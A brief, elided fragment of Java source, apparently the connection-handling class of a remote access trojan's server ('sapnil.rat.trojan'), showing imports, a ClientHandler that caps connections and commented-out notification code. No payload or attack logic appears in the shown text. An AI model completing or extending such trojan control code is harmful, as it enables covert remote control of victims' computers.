package sapnil.rat.trojan.Server;

/*import GUI.Controller;
import GUI.Components.NotificationView;*/
import sapnil.rat.trojan.Server.Data.PseudoBase;
import sapnil.rat.trojan.Server.Data.Repository;
...
public class ClientHandler implements Runnable, Repository {
    ...
    public void run() {
        try {
            ...
            if (CONNECTIONS.size() < SapnilSettings.MAX_CONNECTIONS) {
           ...
           /* if(SapnilSettings.SHOW_NOTIFICATIONS) {
